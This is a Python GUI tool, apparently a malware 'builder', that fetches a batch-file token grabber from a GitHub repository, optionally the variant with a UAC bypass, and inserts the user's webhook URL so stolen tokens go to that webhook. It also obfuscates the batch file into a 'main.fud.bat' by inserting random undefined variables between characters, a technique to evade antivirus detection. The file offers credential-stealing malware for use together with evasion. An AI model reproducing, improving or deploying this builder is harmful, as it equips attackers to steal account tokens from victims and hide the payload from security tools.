import tkinter as tk #prolly built in but idk ngl
import os
import random
from random import randint

try:
    import customtkinter as kdot
except:
    os.system("pip install customtkinter")
    import customtkinter as kdot
    
try:
    from PIL import Image
except:
    os.system("pip install pillow")
    from PIL import Image

try:
    import requests
except:
    os.system("pip install requests")
    import requests

class Buidler(kdot.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("Somali Buidler V2.0")
        self.geometry("700x450")
        
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "test_images")
        
        # use icon for image
        self.iconphoto(False, tk.PhotoImage(file=os.path.join(image_path, "logo.png")))
        
        
        self.home_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "home_dark.png")), dark_image=Image.open(os.path.join(image_path, "home_light.png")), size=(20, 20))
        self.about_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "about_dark.png")), dark_image=Image.open(os.path.join(image_path, "about_dark.png")), size=(20, 20))
        self.hentai_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "hentai_dark.png")), dark_image=Image.open(os.path.join(image_path, "hentai_dark.png")), size=(20, 20))
        self.bottom_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "Kendrick.jpg")), dark_image=Image.open(os.path.join(image_path, "Kendrick.jpg")), size=(500, 230))
        
        self.navigation_frame = kdot.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)
        
        self.rest_of_window_frame = kdot.CTkFrame(self, corner_radius=0)
        self.rest_of_window_frame.grid(row=0, column=1, sticky="nsew")
        self.made_by_kdot = kdot.CTkLabel(self.rest_of_window_frame, text="Made by K.Dot#4044", font=("Arial", 50), padx=10)
        self.made_by_kdot.grid(row=3, columnspan=3, sticky="nsew")
        
        self.home_button = kdot.CTkButton(self.navigation_frame, image=self.home_image, height=40, border_spacing=10, text="Home", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.home_button_event)
        self.home_button.grid(row=0, column=0, sticky="ew")
        self.about_button = kdot.CTkButton(self.navigation_frame, image=self.about_image, height=40, border_spacing=10, text="About", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.about_button_event)
        self.about_button.grid(row=1, column=0, sticky="ew")
        self.hentai_button = kdot.CTkButton(self.navigation_frame, image=self.hentai_image, height=40, border_spacing=10, text="Hentai", fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), anchor="w", command=self.hentai_button_event)
        self.hentai_button.grid(row=2, column=0, sticky="ew")
        
        self.appearance_mode_menu = kdot.CTkOptionMenu(self.navigation_frame, values=["Dark", "Light", "System"], command=self.change_appearance_mode_event)
        self.appearance_mode_menu.grid(row=6, column=0, padx=20, pady=20, sticky="s")
        
        self.home_frame = kdot.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.home_frame.grid_columnconfigure(0, weight=1)
        
        self.about_frame = kdot.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.about_frame.grid_columnconfigure(0, weight=1)
        
        self.hentai_frame = kdot.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.hentai_frame.grid_columnconfigure(0, weight=1)
        
        #webhook stuff
        self.webhook_box_label = kdot.CTkLabel(self.home_frame, text="Enter Webhook URL", text_color=("gray10", "gray90"), anchor="w")
        self.webhook_box_label.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
        
        self.webhook_box = kdot.CTkEntry(self.home_frame, width=300, height=30, corner_radius=10)
        self.webhook_box.grid(row=0, column=1, pady=10, sticky="n")
        
        self.webhook_check_button = kdot.CTkButton(self.home_frame, text="Check", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60, command=self.webhook_button_check)
        self.webhook_check_button.grid(row=0, column=2, padx=10, pady=10, sticky="n")
        
        self.obfuscate_check_box = kdot.CTkCheckBox(self.home_frame, text="Obfuscate", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
        self.obfuscate_check_box.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
        self.uac_bypass_check_box = kdot.CTkCheckBox(self.home_frame, text="UAC Bypass", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
        self.uac_bypass_check_box.grid(row=1, column=1, padx=10, pady=10, sticky="nsew")
        
        #start button
        self.start_button = kdot.CTkButton(self.home_frame, text="Start", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=80, width=200, command=self.start_button_event)
        self.start_button.grid(row=2, column=0, columnspan=3, padx=10, pady=10, sticky="n")
        
        self.bottom_image_place = kdot.CTkLabel(self.home_frame, image=self.bottom_image, text="K.Dot#4044", text_color=("black", "black"), anchor="s", font=("Arial", 20))
        self.bottom_image_place.grid(row=5, column=0, columnspan=3, sticky="n", pady=5)
        
        
        #---------------------------------About Frame---------------------------------
        
        self.about_label = kdot.CTkLabel(self.about_frame, text="About", text_color=("gray10", "gray90"), anchor="w", font=("Arial", 20))
        self.about_label.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
    
        
    def home_button_event(self):
        self.select_frame_by_name("home")
        
    def about_button_event(self):
        self.select_frame_by_name("about")
        
    def hentai_button_event(self):
        self.select_frame_by_name("hentai")
        
    def select_frame_by_name(self, name):
        # set button color for selected button
        self.home_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.about_button.configure(fg_color=("gray75", "gray25") if name == "about" else "transparent")
        self.hentai_button.configure(fg_color=("gray75", "gray25") if name == "hentai" else "transparent")

        # show selected frame
        if name == "home":
            self.home_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.home_frame.grid_forget()
        if name == "about":
            self.about_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.about_frame.grid_forget()
        if name == "hentai":
            self.hentai_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.hentai_frame.grid_forget()
            
    def change_appearance_mode_event(self, new_appearance_mode):
        kdot.set_appearance_mode(new_appearance_mode)
        
    def webhook_button_check(self):
        try:
            r = requests.get(self.webhook_box.get())
            if r.status_code == 200:
                self.webhook_box.configure(fg_color="green")
            else:
                self.webhook_box.configure(fg_color="red")
        except Exception as e:
            self.webhook_box.configure(fg_color="red")
            print(e)
            
    def start_button_event(self):
        obfuscate = self.obfuscate_check_box.get()
        uac_bypass = self.uac_bypass_check_box.get()
        webhook = self.webhook_box.get()
        self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.bat'
        if uac_bypass == True:
            self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main_with_uac_bypass.bat'
        if obfuscate == True:
            self.code = requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook)
            self.obfuscate()
        else:
            with open('main.bat', 'w') as f:
                f.write(requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook))
                
    def make_random_string(self):
        length = randint(5, 8)
        return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for i in range(length))
            
    
    def obfuscate(self):
        carrot = False
        var = False
        with open("main.fud.bat", "a+", encoding="utf-8") as f:
            f.write("::Made by K.Dot\n")
            for line in self.code:
                for char in line:
                    if char == ">":
                        f.write(char)
                    elif char == "^":
                        f.write(char)
                        carrot = True
                    elif carrot == True:
                        f.write(char)
                        carrot = False
                    else:
                        if char == "%":
                            var = not var
                            f.write(char)
                            
                        elif var == True:
                            f.write(char)
                            
                        elif "\n" in char:
                            f.write(char)
                            
                        else:
                            random = self.make_random_string()
                            f.write(f"{char}%{random}%")
                            
        self.create_top_level("FINISHED OBFUSCATION AT   \"main.{OBFUSCATION_LEVEL}.bat\"")
        
    def create_top_level(self, *words):
        window = kdot.CTkToplevel(self)
        window.geometry("500x300")
        
        label = kdot.CTkLabel(window, text=words[0], text_color=("gray10", "gray90"), anchor="w", font=("Arial", 14))
        label.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
        
            
        
        
if __name__ == '__main__':
    Buidler().mainloop()